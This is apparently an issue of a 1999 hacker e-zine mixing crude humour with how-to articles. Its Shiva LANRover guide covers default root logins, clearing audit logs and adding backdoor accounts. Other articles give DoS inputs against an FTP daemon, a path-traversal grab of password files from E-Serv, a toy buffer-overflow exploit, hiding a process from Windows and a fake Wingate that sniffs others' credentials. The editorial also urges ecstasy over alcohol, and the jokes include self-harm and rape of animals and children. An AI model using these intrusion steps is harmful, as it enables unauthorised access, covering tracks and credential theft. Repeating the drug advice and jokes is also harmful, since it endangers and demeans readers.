Yeap, Forbidden Knowledge is back and although we're *still* lame as hell, the
fact that you *read* this shit must mean that either we're not *that* bad, or
you're even dumber than we are. Unfortunately, it's more likely to be the
latter, HEH! :P

Anyway, I have 500 excuses for every mistake in this zine, so wtf should I
worry. Probably the main reason for me being significantly dumber this issue
is an awful, awful, AWFUL Mescalin Tequila drinking competition against 
Corrupt SYN which I lost horribly. And I mean *horribly*. I not only knocked 
the taps off CS's shower by falling into them, but also fell head first 
through a porcelain toilet seat. And the stuff I found out about me the next
morning - GAWD!@#$ Whining "Take me to Vorrrrt" continously when they put me
in the car to take me to hospital, Being dragged down the stairs by my feet,
Puking all over CS's sister's room. What I *do* remember is trying to read 
her e-mail: Fuck me, using Windoze has never been so DIFFICULT. :P~ It took 
me at least 3 minutes to position the cursor over the message I wanted to 
read and although I eventually managed to open it, the writing wouldn't 
keep still and I ended up getting dizzy and falling off the chair headfirst
into her desk. Oh dear, oh dear, the story just goes on and on - I think 
I'll spare you the rest of the details. In short though - alcohol is a 
*stupid* drug. :/ So kidz, take E instead, y0. I have never once had any 
unpleasant effects on it and the only reasons alcohol is legal are that...

A) The government taxes the bo0ze industry to fuck, and
B) Half of the planet are dickhead agro alcoholics already :)

Oh well, hope you enjoy this issue. We've come a long way in the past year,
and I just can't see myself as the same person who wrote FK1. And I'm *glad*
about that - Gawd, everything about those early issues just SUCKED DICK! :P To
be completely honest, I don't think theres been an issue that doesn't totally
suck yet but we may see one in the not-so-distant future. Anyway, To all the 
people who've read FK from the beginning, To all the people who've mailed in
their letters of support and To all the people who have contributed articles
- Thank you. You all rock. Peace Out...

Byteware from Pneuma...
~~~~~~~~~~~~~~~~~~~~~~~
Should you phone (011) 482-8292 you will hear a recording of some-one saying
something to the effect of "Such and Such a publishers have moved, thanks for
calling" followed by a few tones. This is not what it seems. Ever seen a
Johannesburg payphone refusing to be used because it's "Reporting"? Well, this
is the number it calls when doing those reports so you may very well find
something quite interesting there. <efg>

Thanks for tsilik for pointing out that the binary of keylog.exe as
distributed with last issue did not work on faster processers. This is due to
a bug in TP's CRT library and although he gave me a place to find a patch - I
can't remember the URL. :P Ehehe, anyway, if your TP doesn't have the patch
then just get rid of the "uses Crt" and the "clrscr" statements and it will
work like a charm once again. :> A fixed binary version will be made available
sometime somewhere. ;P

A big "WELL DONE!" goes out to Telkom for "fixing" Identicall on pulse
exchanges. Now, instead of only getting the first 3 characters of the number,
you get the first 5... of a 7 digit phone number. *Sigh* I don't know if
Telkom are *completely* incompetent, if they sniff too much cocaine, or if
they think that because they have a monopoly they can be as shit as they want.
Regardless, their attempt to incorporate Identicall into the older exchanges
didn't work, so folks, we *still* have our anonymity for when the new law
comes in. :) What new law you say? Read on...

Time is running out HaX0r kiddies - as of January 1st 2000: hacking is illegal

copies of FK to your jail cell whenever we release them. We will, of course,
rip you off constantly for being there, but it's a small price to pay to get 
your thoughts off how sore your butt is for a while, heh. =)

Lately, we have been getting a lot of questions like "Who/What exactly are the
Forbidden Knowledge crew?" and "Can I join?" and so, I saw it apt to write
this article - a quick explanation of exactly who and what the Forbidden
Knowledge Production team are, to prevent us from getting further really
stupid mail. And believe me, I have gotten a *LOT* of stupid mail lately. :)

First off: we are not a "crew" - we are just a bunch of friends who make a
zine together because we hope that it will increase our chances of getting
laid more often. :P For this reason - you cannot "join" because there isn't
anything *to* join. However, you are more than welcome to send articles - it
makes my life a lot easier when I get a decent amount of contributions and
nobody loves me enough to give me articles most of the time. :(

Now... Who are we? Hmm... I'd better go through this systematically...

Wyzewun is a 16 year-old luzer about to start his final year of high school.
Although he has never *actually* raped a goat, he confirms that should he had
ever had access to a goat at a convenient time, or should a reader donate him
a goat, that may change. He has been seeing a psychologist on-and-off for
nearly three years... He is *still* not cured.

Pneuma is a 17 year-old German immigrant who is also about to start his final
year of high school. We suspect that he is secretly Bill Gates' love-child,
and Pneuma himself confirms that he too suspects this. We have sent several
plea's to Mr Gates to send him maintenance, but have recieved no responses as
of yet. We will continue trying.

Vortexia is a 21 year-old firewall programmer and security consultant. Despite
being a multi-millionaire, he is the stingiest man on earth... right down to
being stingy with article submissions. He spends his spare time bragging about
how leet he is on IRC, as if people were actually listening to him. I would
also like to note that of all the rich people I know, Vortexia has the least
sense for personal hygeine. Yeap, he's a crazy-ass warez-kiddie bum... but we
love him anyway. :)

Moe1 is an 18 year-old who has just finished school and who (strangely enough)
we have never actually met. :P We will probably meeting him for the first time 
sometime early next year. He's the *only* person other than myself who 
contributes on a regular basis: without him keeping FK going would be a lot 
more difficult. Of course, we have to make rumours that he rapes children so 
he, y'know, fits in with the posse. :P

Cyberphreak is a 16-year old nutcase who we are convinced is secretly a crazed
monk with some or other diabolical plan to take over the world. Despite our
many attempts to provoke information out of him such as where he lives, so we
can capture him for study, we have been unsuccessful so far. We enjoy his
company, mentally unstable as he may be, due to the fact that he makes Pneuma
and I feel almost normal. He's still going to have to rape many more goats and
bang his head against the wall many more times before he can rival us though.

And that... is the Forbidden Knowledge production team, why you should walk to
the other side of the road if you see us, and why you can stop mailing us
stupid questions. Goodnight...

                HTTP Basic Authentication explained by Wyzewun
.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.

If you have ever had an experience where your browser has popped up a window
containing a message something to the effect of...

Username and Password Required
Enter username for secret-pr0n-archive at www.posthuman.za.net

... then you have come into contact with a server that uses HTTP Basic
Authentication. This is probably the most common method of protecting access
to non-public documents on webservers and works exactly the same way on all
webservers. Also note that my example banner is from Netscape - other browsers
will vary - but the idea remains the same. Just make sure not to get confused
between this and other fake "authentication" systems like Javascripts that go
to whatever directory is given to them as a password.

Basically, we know a server is using this scheme if we get a HTTP error 401
when we give the wrong password, or don't supply one. So if when trying to
access http://www.posthuman.za.net/pr0n you get an error 401 you know you
need a l/p to access it. Okay, so we know we can't access Post-Human's neato
Goat Porn archive. But if we could, what would the request look like?

GET /pr0n HTTP/1.1
Authorization: Basic mNsJQw2jAJDSlDsdsh==

So should we pick this up in our sniffer logs, its useless, coz it's encrypted
right? Errr... Nope. That's Base64 encoding, not encryption, duh. :) All we
need to do to decode this is a little bit of perl like this...

use MIME::Base64;
print decode_base64("mNsJQw2jAJDSlDsdsh==");

Oh, and if ya don't have the MIME::Base64 module you can download it from
http://www.perl.com/CPAN - it's used for e-mail handling stuff, but can prove
useful for causes such as this one. :) Anyway, when decoding that we see it
really said "ghay.juzer:eyeyamsoleet" - that being the username, followed by a
colon, and then password. In plain text!

So we know that HTTP Basic Authentication offers no real security, but perhaps
we want to implement it for something which a fairly low amount of security
will do for, or for something to do on a rainy day just to see how it's done.
So this is how to set it up under Apache...

First off, we need to create a password file. We do that using the htpasswd
command like so...

[admin@kung-fusion]# htpasswd -c /etc/httpd/conf/passwh0rdz

We then add users to it like so...

[admin@kung-fusion]# htpasswd /etc/httpd/conf/passwh0rdz ghay.juzer

Then you will be prompted to enter the chosen password for ghay.juzer twice,
and the results will be stored in /etc/httpd/conf/passwh0rdz like so...

ghay.juzer:tM0.PnhfVy76k

Btw, in case ya can't see - thats DES encryption over there. That file is also
world readable, so it may cause you a bit of hassle if you don't set up Basic
HTTP Authentication correctly. What I mean by that is make sure there are *no*
common passwords, and preferably, no common usernames either between these
users and people with shell accounts, access to your FTP daemon etc.

Anyway, so we now have a password file, and we need to setup the directory to
protect. So we edit a line like this into /etc/httpd/conf/srm.conf

<Directory /home/httpd/www.posthuman.za.net/pr0n>
  AuthType Basic
  AuthName secret-pr0n-archive
  AuthUserFile /etc/httpd/conf/passwh0rdz
  require valid-user
</Directory>

The AuthName is what gave the name to the Netscape banner I showed you at the
beginning of this article. AuthType is Basic (as oppossed to other, more
secure authentication methods like "Digest" which are great but haven't been
implemented by any browsers yet.) AuthUserFile is where our passwd file is.
And instead of "require valid-user", we could limit access to this directory
to only certain users in the passwd file. So in a passwd file containing
ghay.juzer, jhaypee, warez.mastah and seckzdonkey, we could say...

  require ghay.juzer warez.master seckzdonkey

..so that jhaypee could not steal our z3r0-d4y k0d3z even though we put him
in the passwd file!@#$ Phj34r!@#$ :P

I would include how to do this under IIS5 as well but I don't have NT yet. :(
Maybe I'll get a nice big fan, overclock my Celeron 300A to 450 or something 
similarly insane, chuck in another 32MB of RAM so I have 64MB, and then 
dual-boot NT5 and Solaris x86 on it. That would be nice, because I really 
need to start playing with NT locally more often and because Solaris is just 
plain elite - especially if I'm going to be playing with Java. Hmm, NT5 will
probably be quite a bitch though, coz although it's more stable than 9x, it
wants decent hardware. :( Oh well, I'll just give it a shot, and if it runs
like shit - it'll just have to come off again. Heh, I'll probably end up just
sticking with fBSD 3.3 and *shudder* Win98.

I'm digressing badly here, and the article is basically finished. :) Anyway,
that was, in a nutshell, HTTP Basic Authentication, why it sucks, and how you
can have it if you want it anyway. Hope it was of some use to you...

       Ultra-Mini Gay HOWTO - Dialout/PPP on Shiva LANRovers by DrSmoke
.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.

First thing you do is get out wardialer and scan for 0800's until you find
a shiva, if you can't do this, you suck. Once scanned you can try user: root
pass: <nopass>, 9 times out of 10 this will work. [ You will recognize a Shiva
by the @ Userid: prompt - Ed] The reason that the root account works alot is
beacuse in some cases the admin is not even aware the account even exists!
Most of the system setup is done via the main terminal, so the admin doesn't
have to login.

Like most OS's, Shiva systems have an audit log, so don't sit there trying to
brute force anything, once you are in, you can clear the system log,
"clear log" - requires root, of course.

A lot of the time you can get in and try run ppp but it says "Not authorized
to use PPP" reason being that you need to state that PPP is enabled when
adding a user.

show security <enter> (this gives a list of the security configuration and the
user list.) you should see somthing like this:

[UserOptions]
PWAttempts=0
ARARoamingDelimiter=@
ExpireDays=30
GraceLogins=6

[Users]
admin=/di/do/rt/pw/sh/pwd=hH8FU4gBxJNMMRQ0yhj5ILUbaS/ml=3/fail=1/time=425
jsmith=/di/pw/pwd=.b9BJFBhuA1vuqFa9s8KBlxmngZ/ml=2/time=897646052
mjones=/di/pw/pwd=kRaOhlyT7CKMBldLVBVbektbCE/ml=2/fail=5/time=897646052
user911=/di/pw/pwd=7Xkq8TOwB4juRI51OHkDVVos8S/ml=2/time=910919159

The passwords in the external user list are all 3DES (triple DES) encrypted.
The type of user account set up is determined by the options, such as
jsmith=/di/do etc. To add a user we need to enter the configuration setup in
the command line ...

type: ShivaLanRover/8E# config <enter>

You will then drop into the configuration session.

Enter configuration file lines.  Edit using:
^X, ^U      clear line
^H, DEL     delete one character
^W          delete one word
^R          retype line

Start by entering section header in square brackets []
Finish by entering ^D or ^Z on a new line.

config> (here is where you enter the config commands, to make you own
account
do the follwing)

config> [users]
config> username=/di/do/sh/tp/pw
config> ^D <------ (type control D to finish)


Review configuration changes [y/n]? y
New configuration parameters:
[users]
username=/di/do/sh/tp/pw
Modify the existing configuration [y/n]? y
You may need to reboot for all changed parameters to take effect.

You've just created your own user account which you can use for PPP.

okay, enough on PPP, now time for Dialout - w00h

if system has dialout disabled and you have root, just enable it like so:

enter configuration like I showed you above and do

[DialOut]
Enabled=1
^D

reboot, and DialOut should be enabled.  You can see if it is enabled by "show
configuration" should say Enabled=1, Enabled=0 means its disabled.

MAGIC INFO
----------

Okay, so you've setup Dialout and you using it, but you get disconnected after
20 seconds?!?! The reason behind this is that the pppd string contains one or
two disconnect chars and it disconnects you (I think)

to fix just add these two lines to /etc/ppp/options:

escape 0x1e,0x9e
asyncmap 0

I've also added a chat script example, to make your life a bit easier ...

- snip snip -

# Setup modem
ABORT BUSY ABORT "NO CARRIER" ABORT VOICE ABORT "NO DIALTONE" ABORT "NO ANSWER"
# Dial shiva (send \r\r after delay to start login process)

# Change login/pass as needed

assword? \r\d\d\r\r\r
# If you aren't root, you'll get a > rather than a # prompt.
# all_ports should work, but you can change it do "dialout" or so.
"#-\r\r\r-#" "connect all_ports\r"
# Insert your real chatscript here.

[-*-] Generic Windoze Vulnerability

----[ Proxy Plus

The Proxy+ 2.30 proxy server available from www.proxyplus.cz appears to have
some insecure default settings.

As per default, remote administration of the proxy server is possible to
anyone who cares to point their browser to http://hostname:4400/admin

We must also consider that 99% of the people who are smart enough to know how
to setup an access list for Proxy+ will also be dumb enough to set it up for
localhost only security - forgetting the open web proxy on port 4480 - meaning
that anybody can *still* access the Administrator menu if they have a brain.
This is a concept originally explored in rfp's article in Phrack 54. Werd to
him. :)

Also, do not forget the Telnet gateway which is also open by default, which is
an alternative to a Wingate for purposes of anonymous bouncing. (Although,
unlike Wingate, Proxy+ *does* log by default and is thus not so incredibly
anonymous. :P And then again, people can remotely turn logging OFF by default,
so wtf) Regardless, the welcome banner looks like this, should you wish to
scan for it - You've probably seen one before...

<blank line>
TelNet Gateway Ready
Enter destination (host_name:port):

Overall, hacking yourself a Proxy Plus proxy is much better than a Wingate
because you can keep it all to yourself, administer it remotely etc. etc. -
it's just damn nice in general. :)

Oh, and Proxy+ Servers are most common in Czechoslovakia (.cz) if you wanna
try and scan for them.

----[ NiteServer FTPd

This server is coded in VB and so, as you can imagine, is vulnerable to
thousands of DoS attacks. The first occurs when the daemon is fed over 40 or
so "USER whatever" strings. The FTPd runs out of memory and commits suicide.

The second occurs when a password (PASS) is not terminated, and the daemon
just keeps on getting fed more and more characters, and allocating memory for
all of them. While the daemon is being attacked, it will not respond to any
users who are connecting to it, and the actual program will refuse to
communicate with anyone physcially at the host. Windows will become more slow
and unusable then it already is and the system may or may not fall over     
completely eventually. 

The third: login, then type "PORT fuck,me,but,is,this,ftpd,lame,or,what" and
then disconnect immediately. The FTP daemon will stop accepting connections.

The fourth: give a long argument to RNTO. Once again, it decides to stop
accepting connections. Is this daemon a fucking pussy or what? I could go on
to list more, but it would just be cruel. Shjeesh, what's even sadder is that
the author is trying to sell the source code to this thing: as if some-one
would actually want it - HEH!@#$%

----[ ISpy Webcam

The very popular ISpy Webcam by Creative stores the password for the FTP site
it uploads to in the registry under \\HKEY_CURRENT_USER\Software\ISpy\ISPY\FTP
in the "Password" value with a very laughable "encryption" scheme. Just a
substitution cipher. I would include the key, but really, it's not worth the
space. Just keep this in mind and figure the rest out yerself. :)

----[ XiRCON

The XiRCON IRC client disconnects from the IRC server it's connected to when
recieving overly long CTCP messages. What an elite client.

----[ E-Serv

E-Serv (available from www.eserv.ru) is a SMTP, POP3, NNTP, FTP, HTTP, Proxy,
and Finger server. When testing out The HTTP server on my box, which is
accesible by default on Port 3128 and will most probably be moved to 80 on
servers where it's being used as a webserver (It is also the Proxy's remote
administration thingy), I found it to have a serious security flaw. All
versions prior to 2.8 are vulnerable. We downloaded the "latest" version from
Tucows (2.5) and assumed the bug had not been fixed, but when we mailed the
authors of the software, turned out they had found the bug themselves and
fixed it in 2.8! Guess Tucows aren't into updating their archive, eh?
Regardless, old versions are still common and I don't think the vulnerability
has been covered publically, so let's get to the sploit...

[drew@kung-fusion]$ telnet ghay.windoze.box 3128

Hmm, well I was right to an extent. You can't list files, but you *can*
retrieve any file you want provided you know the name which is good enough if
we just go and retrieve the password files. :) And after all, I *might* be
able to list files, if the damn directory listing *worked*. *Sigh* :P Anyway,
we should get sam._ on NT boxes, but on 9x boxes you'll probably have to grab
the E-Serv password file which can be found in /../../../conf/EServ.ini and
uses fairly trivial encryption. Also note that the FTP server will be on port
3121 by default, and may be moved to port 21 on some boxes.

Now for a few interesting things that will probably apply to current versions
as well: in E-Serv is that the anonymous FTP account applies for POP3 as well,
so an E-Serv server can be a nice anonymous mail pickup for anyone who cares
to connect to the POP3 daemon and login anonymously. The daemon also does
stuff like making the modem dial/hangup CGI feature (http://host:3128/dial)
accessible to anyone with a user-level login, including anonymous, although it
can be configured to be Admin only, it is like this by default. Ditto for the
webmail interface accepting anonymous logins. And finally - a hint: looking
for folks that run E-Serv? Scan Good ol' Mother Russia, heh.

----[ Generic Windoze vulnerability

So many Windoze FTP/HTTP daemons allow you to play with files with device
special filenames like COM1. This can result in allowing you to disconnect 
their modems, or in a worst-case scenario, taking full control of their 
modems and/or printers.

=============================================================================
PH-99:01                        PHEAR Advisory
                               December 04, 1999
                       Alledged "Deity" hacker gang attacks. 
-----------------------------------------------------------------------------

After a good coupla hours worth in a Mass Debate (Geddit? Massdebate!@#$ huh
huh.. huh... yeh) *ahem* err... the Post-Human Electronic Anarchy Research
centre has finally decided upon the implications of the following hack attack
perpetrated almost entirely by the member of the "Deities" commonly refered to
as "God".

The attacks are untraceble and so the entire blame often lies entirely on him,
and we cannot determine if some or all of the attacks originate from other 
members of the "Deities".
-----------------------------------------------------------------------------
The bug affects the following Systems and\or OS's:
        
          -Every single Platform and Hardware configuration
          -OS Independant (ie. all of them)

Laptops are generally not affected as long as the "power-in" cable is not
plugged in at that moment or the "carrier" is not the highest object at the
time.

As we receive additional information relating to this advisory, we will
place it in

        http://127.0.0.1/all/for/myself/mwuahahahaha

We encourage you to check our README files regularly for updates on advisories
that relate to your server.

-----------------------------------------------------------------------------

I.   Description

The attacks originated from the "Deity" groups first conception, sometime in
what era is reffered to colloquially as "Negative Infinity". The bug appears
often and in extreme cases not only affects computers, but other household
appliances including persons, tree's and electricity pylons.

The attack is generally a Denial of Service, but it has devastating effects
on most objects targeted, causing a flux in high voltage electricity resulting
in extreme hardware failure, often "frying" motherboards, cpu's and other
internal organs.

The attack is purported to be called "Lightning" and is implimented by
lightning.c which is rumoured to be available to certain deities and magicians
and runs under the Microsoft UNIX Operating System. The attack is more likely
to affect systems and appliances that are either on a high elevation in
relation to other objects in the genral area and on so called "magnetic
plains" which are generally properties in which the sub-terra contains an
unusual amount of iron bearing loadstone, but be warned, the attack has
capabilities to propogate itself through power lines and telephone lines when
the "worm" mode is enabled.

II.  Impact

This "God" character appears to be able to target any object anywhere and at
anytime. Some cases of his handy work include a Roy C. Sullivan, former
Yellowstone Park Ranger, whose physical person was attacked 7 times but
luckily suffered no actual hardware damage due to his implementation of a
security device that is commonly refered to as "Tough Inbred Hick Genes".
Another case that occured earlier this year was the two incidents when a
member of the "Deities" attacked African soccer teams, once damaging the
entire teams hardware and internal organs, and the other only half of the
team had to be replaced. Also they often victimise common home users PC's
using the worm method to go through the power line and knocking out as much
as 200 personal computers in a row.

III. Solution

The Post-Human Electronic Anarchy Research Board investigated a number of
potential methodologies for protecting one's system and one's self from 
this extremely potent Denial of Service attack, but all proposed solutions
only lessened chances of being attacked, and not completely protected one 
against the threat of being attacked.

However, thanks to some brilliant suggestions from Wyzewun, we managed to
design a system to protect one completely from these instances of "Divine
Intervention." Just follow these five simple steps...

1. Unplug your computer
2. Throw it into the ocean
3. Devour your next of kin
4. Sell your house
5. Kill yourself

We suggest you follow these steps as soon as possible, as CERT are having a
great deal of trouble catching "God" and the other members of his hacker gang,
and by not acting immediately there is a higher chance that you will be
affected by this and other security flaws in Earth's architecture.

                Principles of Buffer Overflow explained by Jus
.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.

This article is an attempt to quickly and simply explain everyone's favourite
manner of exploiting daemons - The Buffer Overflow.

- Huh? -

The remote buffer overflow is a very commonly found and exploited bug in badly
coded daemons - by overflowing the stack one can cause the software to execute
a shell equal to its current UID - thus if the daemon is run as root, like
many are, a root shell will be spawned, giving full remote access.

A buffer is a block of computer memory that holds many instances of the same
data type - an array. Arrays can be static and dynamic, static being allocated
at load time and dynamic being allocated dynamically at run time. We will be
looking at dynamic buffers, or stack-based buffers, and overflowing, filling
up over the top, or breaking their boundaries.

A stack has the property of a queue of objects being placed one on top of the
other, and the last object placed on the stack will be the first one to be
removed. This is called LIFO - or last in first out. An element can be added 
to the stack (PUSH) and removed (POP). A stack is made up of stack frames, 
which are pushed when calling a function in code and popped when returning it.

The stack pointer (SP) always points to the top of the stack, the bottom of it
is static. PUSH and POP operations manipulate the size of the stack
dynamically at run time, and its growth will either be down the memory
addresses, or up them.  This means that one could address variables in the
stack by giving their offsets from SP, but as POP's and PUSH's occur these
offsets change around. Another type of pointer points to a fixed location
within a frame (FP). This can be used for referencing variables because their
distances from the FP will not change.

- The Overflow -

A buffer overflow is what happens when more data is forced into the stack than
it can handle. We use this to change the flow of execution of a program -
hopefully by executing code of our choice, normally just to spawn a shell.

We can change the return address of a function by overwriting the entire
contents of the buffer, by overfilling it and pushing data out - this then
means that we can change the flow of the program. By filling the buffer up
with shellcode, designed to spawn a shell on the remote machine, and
overwriting the return address so that it points back into the buffer, we can
make the program run the shellcode.

This is just a simplified version of what actually happens during a buffer
overflow - there is more to it, but the basics are essential to understand if
you want to win an argument one day.

[ Epilogue by Wyzewun:

Time for a practical example. I did this some time ago on my Dad's Windoze box
to explain it to myself: I had downloaded a file on Win32 buffer overflows but
I really didn't feel like reading, so I figured it out myself instead. It took
me +-20 mins to do the whole thing, but at least I was keeping a log of me
trying to get it right so I can just paste it more or less unchanged here -
save, of course, for the explanations. Next time I'll get human and actually
READ UP on whatever I'm trying to do before I try DO it so I don't waste so
much damn time. :/ Anyway, here's the notes...

#include <iostream.h>
#include <string.h>

int main() {

  char buffer[40];
  char buffer2[20]; // This doesn't need to be smaller though

  cout << "Gimmee a variable\n";
  cin >> buffer;
  strcpy(buffer2, buffer);
  return 666; }

Because strcpy() has no bounds checking, there is an obvious buffer overflow
vulnerability here...

c:\>overflow
Gimmee a variable
12345678901234567890

It executed fine. Now lets try...

c:\>overflow
Gimmee a variable
123456789012345678901

At this point Windoze cuts in with the following...

OVERFLOW caused an invalid page fault in module OVERFLOW.EXE at 015f:00402127.

Registers:
EAX=0000029a CS=015f EIP=00402127 EFLGS=00000206
EBX=00530000 SS=0167 ESP=0063fe0c EBP=00630031

Bytes at CS:EIP:
89 45 e4 50 e8 12 15 00 00 8b 45 ec 8b 08 8b 09 

Stack dump:

00403d18 00407190 00000000 0063ff78 bff8b537 00000000 81596754 00530000 

Is this a buffer overflow bug or is this something else we are mistaking for
one? Well, let's check, we feed it a good 30 "a" characters and we look at the
values of the registers when it dies....

Registers:
EAX=0000029a CS=015f EIP=61616161 EFLGS=00000202
EBX=00530000 SS=0167 ESP=0063fe00 EBP=61616161
ECX=0063fddc DS=0167 ESI=81596628 FS=117f
EDX=00006161 ES=0167 EDI=00000000 GS=0000

Aaah, see that? EIP is 61616161 - 61 being the hex value of the "a" character,
so it's overflowing allright. Now let's exploit it. :) First off, we add the
following line into the example C++ proggy above...

cout << &buffer2 << "\n";

And when executing the program, the output we get is as follows...

0x0063FDE4
Gimmee a variable

Right, so buffer2's address is 0x0063FDE4 - and just in case that's a bit off
for some reason - we'll pad it a bit.

Padding? Right. Executing the NOP function (0x90) which most CPU's have - just
something to do nothing. That way, hopefully, when we overwrite the return
address we can land somewhere in the middle of the NOPs, and then just execute
along until we get to our shellcode. Errr, I'm not being clear, what I mean is
the buffer will look like: [NOPNOPNOPNOP] [SHELLCODE] [NOPNOPNOPNOP] [RET]

Shellcode? Right. We can execute pretty much anything we want, and as much as
I would like to have interesting shellcode, I don't have the tools to make
some on this PC, and I *really* don't feel like going online to rip somebody
else's. And so, my choice in shellcode - int 20h - program termination. :)

Right!!! So our shellcode is 2 characters, and we can feed the program 24
characters before we start overwriting the return address, so lets have 11 NOP
characters on either side of our shellcode just to make it pretty and even
looking. Let's try this out...

c:\>overflow
Gimmee a variable
êêêêêêêêêêêÕ êêêêêêêêêêêc˝‰

c:\>

Heeey, I gave it too many characters and it didn't crash. It worked. :) That
string in hex would be 9090909090909090909090CD20909090909090909090909063FDE4,
the CD20 in the middle being interrupt 20h, and the 63FDE4 being the address
of the buffer we're overflowing, which we are setting as the return address,
namely 0x0063FDE4. Hopefully you're beginning to see the idea here. If you
would like to play around with my example file some more, I included the
binary in the general-junk directory of this issue. Have fun! ]

So now as another practical example, let's look at how we would hide a program
from Windoze using masm32. To do this we simply pass the program's process ID
to the RegisterService() function thus registering the program as a service,
which wont show up in the windows task list.

.data               ; first we define in our data section

    szKernel32      db   "Kernel32.dll",0
    szRSP           db   "RegisterServiceProcess",0

.code               ; now we start the code
start:

    push   offset szKernel32
    call   GetModuleHandle       ; get Kernel32.dll handle
    push   offset szRSP
    push   eax
    call   GetProcAddress        ; get function address
    mov    ebx, eax              ; save our pointer into ebx

    call   GetCurrentProcessId   ; get current process id

    push   1                     ; 1 = Register Service, 0 = Unregister Serv.
    push   eax                   ; process id
    call   ebx                   ; call RegisterServiceProcess

end start

We could do this in any language which we can access the Win32 API from
really, I just used assembly as an example because it's what we're playing
with here. :)

[ Some more additions from Wyzewun: And there you have it. If you're
  interested in getting involved with Assembly Programming, look around at the
  stuff available in the programming tutorials section of Packetstorm Security
  and particularly the tutorial available there made by the University of
  Guadalajara (don't ask me where that is) which is quite detailed. As you get
  better you will find other resources for ASM coding all over the place, so
  look around and you shouldn't have much trouble finding what you want. :)

  PacketStorm also has some great resources for other programming languages
  like C/C++, Pascal, JavaScript, Perl, Python - you name it. :) Mm, no TCL/TK
  yet, but I s'pose you can pick that up at other places.

  Also, try and see if you can get hold of the SAMS MS-DOS Bible - it's what
  I learnt what I know about assembly from and it's a great reference for
  DOS/Windoze ASM. Mmm, I'm still using the Second Edition (Covers MS-DOS 3.3)
  but I'm sure there are newer versions lying around. Well, I hope. Otherwise
  it won't be much use, now will it? :) ]

                     Fun with "Trojan" Wingates by Wyzewun
.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.

Allright, here's a lame little idea for the purpose of abusing hacker kiddies.
Scenario: It's a Sunday afternoon. There is nothing to do. The sun is cooking
your brain and you've hardly the energy to move, let-alone actually do
something that requires an IQ above that of an oyster. What do you do?

Step One
+-====-+
Install a Sniffer on your box. There is a nice collection of sniffers at
ftp.technotronic.com/unix/network-sniffers or alternatively, if you have
friends like Vortexia who are lamer warez kiddies that can leech stuff for
you, have a NT/98 box as your gateway and install Sniffer Pro by Network
Associates on it. It's a seriously kickass proggy - Even though NAI suck. :P

Step Two
+-====-+
Anyway, so for lack of anything better to do, lets go to www.cyberarmy.com and
look at the list of Wingates. Hmmm... Bullshit, Bullshit, Bullshit - Aaah,
here's one that works - lets say - dns.gincorp.co.jp - Right, so now we have
a Wingate. Errr... So What?

Step Three
+-======-+
[drew@kung-fusion]$ cat > phjeeer << seckz
#!/bin/bash
nc dns.gincorp.co.jp 23
echo shj3esh j0or a fuqn tw1t
seckz
[drew@kung-fusion]$ chmod 755 phjeeer

Step Four
+-=====-+
Hmmm. I'm still bored. I know! I think I'll su and edit some random junk into
my /etc/inetd.conf or something...

Before Eliteness...
#telnet stream tcp nowait root /usr/local/libexec/tcpd /usr/libexec/telnetd

After Eliteness...
telnet stream tcp nowait drew /usr/local/libexec/tcpd /home/drew/phjeeer

Now we 'killall -9 -HUP inetd' - loose our connection to that lame IRC
session which wasn't even vaguely interesting anyway, and we are now left just
as bored as before.

Step Five
+-=====-+
I'm bored. I think I'll telnet into myself...

[drew@kung-fusion]$ telnet leet.bsd.box
Trying 192.168.33.3...
Connected to leet.bsd.box.
Escape character is '^]'.
Wingate>

A Wingate! Fuqn shit du0d! I'm gonna go back to www.cyberarmy.com and add
myself to the Wingate list so peeble can abj00ze me too!@#$%

And then...
+--==--==-+
Within a few hours, our sniffer logs begin to pick up all sorts of interesting
things like usernames and passwords for things people shouldn't be accessing,
lamers making fools of themselves on IRC and all sorts of funny stuff. Aaah,
at last. Entertainment at the expense of the hacker community. Who says we
aren't united, man? I *Love* these guys...

But Remember...
+--==--==--==-+
This can be dangerous and if you don't select the Wingate to abuse carefully
you may end up getting yourself in more trouble than you bargained for. Don't
be stupid. :)

Yeh, we gave up on keeping Post-Human up, coz Vortexia is useless and we
really don't feel like finding another host. We might see something when
Pneuma and I *finally* get our damn FreeBSD box online, but until then, we
have regularly updated mirrors, so it doesn't really matter. :/

Now, for those of you who think the zine is pretty much finished now - I'm
afraid you're wrong. The zine isn't finished yet. Why? Because I still have a
bone to pick with a certain institution: an institution void of any form of
common sense, an institution which you probably refer to as "the scene."

Yes, the "hacking scene" - probably the biggest force stunting the growth of
hacking itself. For a group of people who *dare* to call themselves
anarchists, I have never seen such a blatantly ordered institution. There is
a strictly set-out protocol to the scene, what is cool, what is not, how to
look elite etc. etc. Although classed according to opinion somewhat, it 
always comes down to the same things...

And those "same things" I refer to, have absolutely FUCK ALL to do with
hacking. Trading n34t0 3L1t0 0-d4y sPL0itZ with complete twits on IRC, who
probably haven't the first idea about how the thing actually works. Defacing
webpages pointlessly just so other people in "the scene" can see your handle,
or sometimes trying to pin an ill-fitting political motivation to your
defacement as an after-thought (which is worse). Gathering in IRC channels 
where nothing technical is ever actually discussed, and life is all about 
showing everyone how leet we are, how many boxes we own and how dumb everyone
else is. And even when there *is* technical conversation, the motivation 
behind it is all fucked up - it's not for the sake of learning from eachother
- its all about making eachother look stupid, or making one's self look smart.

Anyone who can honestly say that the hacking scene promotes hacking is either
a liar, or a complete outright idiot. Look at the people that become well
known in the hacking scene - lets pick gov-boi from hack.co.za as an example.
Why did he become well known? Because he can hack? Hell no! It wasn't 4 months
ago that man was writing "No Distro" mIRC war scripts (I can publish them if 
you don't believe me), his C code makes even novice coders laugh and he's 
never actually done *anything* requiring any intelligence. So why do people 
know him? People know him because he has taken the time to categorize a whole
bunch of exploits into the operating systems they affect, and put it on a 
webpage. This means that various clueless individuals have a one-stop resource
for clicking on the operating system they want to hack, downloading and 
running the exploit they don't understand, and getting illegitimate access to
some-one else's system in a matter of seconds. And because gov-boi provides
this service - he is "elite".

And the point is: this is what is required to be an important person in this
institution. This is what one HAS to do. Know the right people, hang in the
right places, have the right exploits - and you're elite. Without even having
to be able to do anything requiring an IQ above that of a piece of cheddar
